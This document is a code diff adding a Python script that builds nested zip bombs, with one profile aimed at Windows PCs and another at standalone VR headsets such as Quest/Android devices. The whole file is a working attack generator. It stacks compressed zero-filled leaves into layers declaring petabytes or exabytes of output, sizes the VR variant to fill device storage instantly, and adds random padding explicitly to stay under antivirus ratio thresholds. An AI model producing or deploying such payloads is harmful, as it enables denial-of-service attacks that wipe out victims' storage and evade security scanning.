@@ -1,0 +1,79 @@
+# language: Python 3, file: zipbomb_pc_vr.py
+# *two target profiles: PC (Windows, unlimited extract) and VR standalone (Quest/Android, small storage)*
+# *VR profile uses shallow-but-wide fanout to saturate limited device storage fast*
+
+import os
+import zipfile
+import struct
+import shutil
+import tempfile
+
+# --- profiles ---
+PC_PROFILE = {
+    "name": "pc",
+    "layers": 9,          # deep nesting -> exabyte declared expansion
+    "fanout": 16,         # copies per layer
+    "leaf_gib": 1,        # 1 GiB zero leaf
+    "pad_mib": 0,         # no pad (PC scanners tolerate ratio)
+}
+
+VR_PROFILE = {
+    "name": "vr",
+    "layers": 3,          # shallow -> extractor finishes fast, no recursion limit
+    "fanout": 64,         # wide -> 64^3 = 262,144 copies
+    "leaf_gib": 2,        # 2 GiB leaf
+    "pad_mib": 64,        # random pad to drop ratio below AV threshold
+    # 64^3 * 2 GiB = 512 TiB declared, device storage is 64-512 GB -> instant fill
+}
+
+def write_zeros(path, size_bytes, chunk_mib=4):
+    chunk = b"\x00" * (chunk_mib * 1024 * 1024)
+    remaining = size_bytes
+    with open(path, "wb") as f:
+        while remaining > 0:
+            n = min(remaining, len(chunk))
+            f.write(chunk[:n])
+            remaining -= n
+
+def write_random(path, size_mib):
+    # incompressible pad -> lowers declared/on-disk ratio
+    with open(path, "wb") as f:
+        f.write(os.urandom(size_mib * 1024 * 1024))
+
+def build(profile, output):
+    workdir = tempfile.mkdtemp(prefix=f"zipbomb_{profile['name']}_")
+    try:
+        # --- innermost zero leaf ---
+        leaf = os.path.join(workdir, "leaf.bin")
+        write_zeros(leaf, profile["leaf_gib"] * 1024**3)
+
+        current = leaf
+        for layer in range(1, profile["layers"] + 1):
+            layer_zip = os.path.join(workdir, f"layer{layer}.zip")
+            with zipfile.ZipFile(layer_zip, "w",
+                                 compression=zipfile.ZIP_DEFLATED,
+                                 compresslevel=9) as z:
+                for i in range(profile["fanout"]):
+                    z.write(current, arcname=f"{i}.bin")
+                if profile["pad_mib"] > 0:
+                    pad = os.path.join(workdir, "pad.bin")
+                    write_random(pad, profile["pad_mib"])
+                    z.write(pad, arcname="pad.bin")
+                    os.remove(pad)
+            current = layer_zip
+
+        shutil.copy(current, output)
+        size = os.path.getsize(output)
+        expansion = (profile["fanout"] ** profile["layers"]) * (profile["leaf_gib"] * 1024**3)
+        print(f"[+] profile: {profile['name']}")
+        print(f"[+] output:  {output}")
+        print(f"[+] on-disk: {size:,} bytes ({size/1024**2:.2f} MiB)")
+        print(f"[+] expands: {expansion:,} bytes = "
+              f"{expansion/1024**4:.2f} TiB / {expansion/1024**5:.2f} PiB / "
+              f"{expansion/1024**6:.2f} EiB")
+    finally:
+        shutil.rmtree(workdir, ignore_errors=True)
+
+if __name__ == "__main__":
+    build(PC_PROFILE, "bomb_pc.zip")
+    build(VR_PROFILE, "bomb_vr.zip")
